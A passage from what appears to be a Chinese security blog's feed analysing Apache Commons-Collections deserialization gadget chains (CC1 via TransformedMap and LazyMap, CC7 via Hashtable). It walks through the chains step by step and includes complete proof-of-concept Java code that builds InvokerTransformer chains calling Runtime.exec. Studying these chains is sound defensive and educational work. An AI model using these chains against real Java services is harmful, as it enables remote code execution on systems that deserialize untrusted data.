51);">以上代码其实就是等同于<br></font>((Runtime)Runtime.class.getMethod(“getMethod”,null).invoke(null,null)).exec(“calc.exe”);</p><p>将修改后的代码重新运行看看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造transformedmap是调用tranform()的前置条件</span></span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">                map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取sun.reflect.annotation.AnnotationInvocationHandler类的Class对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="comment">//serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>发现还是不能运行我们动态调试看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714492748596-0fb8e329-f004-47b3-a544-e3e35b9e90b8.png" alt=""></p><p>发现在这里为空所以不能进入if条件，也就无法调用setValue方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714493360560-346d68a7-c71d-42f7-a64d-f836b8c231d1.png" alt=""></p><p>在这里我们发现他回去获取我们传入的注解类型并且获取注解里面方法的名字，然后通过判断我们传入的名字是否与注解里的名字是否一致，一致则不为空否则为空就不进入if条件。所以这里我们子啊put时将键的值改成注解类型里面的方法名即可：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714493512596-ca057800-313a-4866-8652-f0625c253621.png" alt=""></p><p>可以看到Target的方法名时value所以改成value就可以了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714493541211-ea1119a7-895d-48e2-8286-e78b5d30d5bb.png" alt=""></p><p>这样就可以执行了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714493565966-39b0b375-5f9e-41e0-8db4-f32dfb878fd3.png" alt=""></p><h3 id="cc1TransformedMap调用链">cc1TransformedMap调用链</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714626920076-d1f2e785-11df-4e1c-8f38-31c0b67b6f00.png" alt=""></p><p>参考：<a href="https://xz.aliyun.com/">https://xz.aliyun.com/</a></p><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.337.search-card.all.click&amp;vd_source=82398f68c82cb90e0d9aa4fea90e36a0">https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.337.search-card.all.click&amp;vd_source=82398f68c82cb90e0d9aa4fea90e36a0</a></p><p><a href="https://blog.csdn.net/weixin_49047967/article/details/134763883">https://blog.csdn.net/weixin_49047967/article/details/134763883</a></p><h2 id="LazyMap">LazyMap</h2><p>LazyMap和TransformedMap类似，都来自于Common-Collections库，并继承了</p><p>AbstractMapDecorator。</p><p>TransformedMap的漏洞触发点：是在利用put方法写入元素的时候触发了transform方法从而触发了我们构造的恶意利用链</p><p>LazyMap触发点与TransformedMap有点差别我们还是向以前通过查找transfrom的调用方法来看看：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714554338581-4bcad701-9832-4724-b268-bc7bcadcb3f9.png" alt=""></p><p>发现LazyMap的get方法中factory对象调用了transform方法所以只要我们能够将factory的对象设为invokertransformer对象，当map.containskey(key) == false，就会调用factory.transform。就可以进行rce</p><p>所以查看一下LazyMap的构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现是factory对象是可控的，不过这里是protected类型所以不能直接实例化，但是LazyMap中也有一个静态方法decorate可以实例化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在TransformedMap利用链完善这篇文章中我们有分析AnnotationInvocationHandler，在其readObject方法中通过调用setValue添加元素来触发transform。但是在readObject方法中没有直接调用到Map的get方法。不过ysoserial的作者找到了在该类的invoke方法中调用了get方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714554837323-4cf489a2-de94-4c92-8e3c-8e3fca36fd6c.png" alt=""></p><p>但是反序列化的时候应该如何触发该方法呢，我们想到了java的动态代理，这里参考<a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714631676669-3aecdb26-7ebe-4a78-83d3-1e71ac849c83.pdf">Java安全漫谈 - 11.反序列化篇(5).pdf</a><a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714631676791-e9c42936-3bc0-4c29-b034-115f85120c57.pdf">Java安全漫谈 - 10.用TransformedMap编写真正的POC.pdf</a></p><p><a href="https://mp.weixin.qq.com/s/doU_WAxgCHpApPpogngVtg">https://mp.weixin.qq.com/s/doU_WAxgCHpApPpogngVtg</a>、p牛的文章解释为什么可以在反序列化的时候可以调用invoke方法</p><h3 id="Java对象代理">Java对象代理</h3><p>作为一门静态语言，如果想劫持一个对象内部的方法调用，实现类似PHP的魔术方法 __call ，我们需 要用到 java.reflect.Proxy ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> </span><br><span class="line"><span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure><p>Proxy.newProxyInstance 的第一个参数是ClassLoader，我们用默认的即可；第二个参数是我们需要 代理的对象集合；第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻 辑。 比如，我们写这样一个类ExampleInvocationHandler：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vulhub;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> Map map;</span><br><span class="line">    <span class="keyword">public</span>  <span class="title function_">ExampleInvocationHandler</span><span class="params">(Map map)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span>(method.getName().compareTo(<span class="string">&quot;get&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hook method: &quot;</span>+ method.getName());</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hacked Object&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.map,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> vulhub;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExampleInvocationHandler</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>());</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br><span class="line">        proxyMap.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> (String)proxyMap.get(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看执行结果，我们能发现我们明明传进Map是test值为xxx，但是我们获取到的结果却是hacked Object。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714555123018-c1afff61-6e34-4b50-b9b3-44b2ec105dfc.png" alt=""></p><p>这里用自己的话解释这个动态代理的应用原理，就是说我们使用这个Proxy.newProxyInstance这个类去代理一个对象时，这个对象调用任意方法都会触发我们传入的InvocationHandler对象的invoke方法。</p><p>AnnotationInvocationHandler，这个类实际就是一个InvocationHandler，将这个对象用Proxy进行代理，那么在readObject的时候，只要调用任意的方法。就会自动调用到 AnnotationInvocationHandler#invoke 方法，进而触发我们的LazyMap#get。我们可以调试看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714555448211-7a496371-98f0-4bbb-9127-807b894099ce.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714555530093-2cf6708d-98cf-4b2e-a9e8-d19352f653ba.png" alt=""></p><p>在这里发现membervalues调用entyset方法时调用了invoke方法。</p><p>所以我们可以构造出LazyMap的利用链</p><p>首先使用LazyMap替换TransformedMap。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure><font style="color:rgba(0, 0, 0, 0.9);">  </font>然后通过反射获取<p>sun.reflect.annotation.AnnotationInvocationHandler</p><p>这个内部类，然后进行对其进行Proxy。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure><p>代理后的对象叫做proxyMap，但我们不能直接对其进行序列化，因为我们入口点是：</p><p>sun.reflect.annotation.AnnotationInvocationHandler#readObject，</p><p>所以我们还需要再用AnnotationInvocationHandler对这个proxyMap进行包裹：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br></pre></td></tr></table></figure><p>完整的poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//lazymap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);</span><br></pre></td></tr></table></figure><h3 id="cc1-LazyMap调用链">cc1 LazyMap调用链<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714669450577-aff3a171-9f0e-43f0-9a76-c5966722e65b.png" alt=""></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;TranformedMap&quot;&gt;TranformedMap&lt;/h2&gt;
&lt;p&gt;复习一遍之前学过的，由于太过久远导致基本全部忘记了，还有就是当时的笔记记得太过于潦草导致根本没法复习。&lt;/p&gt;
&lt;p&gt;这次重新跟一遍cc1链。&lt;/p&gt;
&lt;h3 id=&quot;环境搭建&quot;&gt;环境搭建&lt;</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反序列化" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="CC链" scheme="https://oceanzbz.github.io/tags/CC%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Commons-Collections7反序列化</title>
    <link href="https://oceanzbz.github.io/post/9bd53077.html"/>
    <id>https://oceanzbz.github.io/post/9bd53077.html</id>
    <published>2024-12-30T06:45:15.000Z</published>
    <updated>2025-03-05T07:24:36.789Z</updated>
    
    <content type="html"><![CDATA[<p>其实该条利用链和cc5也是大同小异，也是利用LazyMap去触发的，只不过入口点换成了Hashtable</p><p>我们先来直接看看网上的poc然后跟着分析分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        execArgs),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformers</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformers.set(transformerChain,transformers);</span><br><span class="line"><span class="comment">//        Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="问题1">问题1</h4><p>从poc中我们可以看到进行了Hashtable两次put而且都是相同的key，为什么要这样做？我们直接看其readObject方法就不倒着调试了。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714747290107-e9dba1e1-7eb7-400b-9db5-a354fc864189.png" alt=""></p><p>ements代表键值对的个数，我们创建Hashtable时传入了两个键值对，故elements=2</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714749474176-5dc0367a-abcf-4683-b2e0-05dc99129ba2.png" alt=""></p><p>可以看到在readObject中的for循环里读出了序列化写进去的key 和 value值 这里可以看到第一次循环获取的是第一次hashtable put的key 和 value值然后跟到reconstitutionPut方法看看<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714749848646-ff4fe199-d812-4d22-a3e0-6bdd7b093fdd.png" alt=""></p><p>从调试信息以及代码可以看出第一次for循环是没有进去的，是因为这里的tab是空的所以没法进入，而我们发现他在后面又直接将我们传入过来的key（第一个传入的lazymap） 和 value  （值为1）又直接实例化到tab里面了。</p><p>所以继续跟进：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714750203246-2fbb6072-69fd-4cf7-8027-f769d544af3d.png" alt=""></p><p>等到第二次传进来的值的时候就可以进入for循环了，这就是为什么我们需要两次传入同样的key，这时会在for循环里调用e.key也就等于LazyMap对象（第一次传入的）的equals方法并且传入的参数key也是LazyMap对象是第二次hashtable put进来的，但是这里有一个问题是我们去查看LazyMap并没有发现equals方法，于是我们去找他的父类发现在AbstractMapDecorator这个抽象类里实现了equals方法我们继续跟进看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714750240472-95a635f2-3388-484b-baae-be078165c16c.png" alt=""></p><p>这里我们知道LazyMap也是put两个一样的key是hashmap对象所以这里会调用hashmap的equals方法</p><p>但是同样他也没有equals方法所以直接到它的父类AbstractMap里看<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714750954087-89e308f6-13bd-4644-a736-49c0865a9e0b.png" alt=""></p><p>此时value并不为空所以进入到equals方法中且调用了get方法，此时的m就是第二次put进来的LazyMap对象，</p><p>所以也就触发了rce（后续一系列的过程跟其它lazymap很像）就不再一一跟了。</p><p>补充说明：这里分析的有点问题，这里涉及到hash碰撞的问题建议先参考：<a href="https://www.anquanke.com/post/id/248169#h3-4">https://www.anquanke.com/post/id/248169#h3-4</a></p><p><a 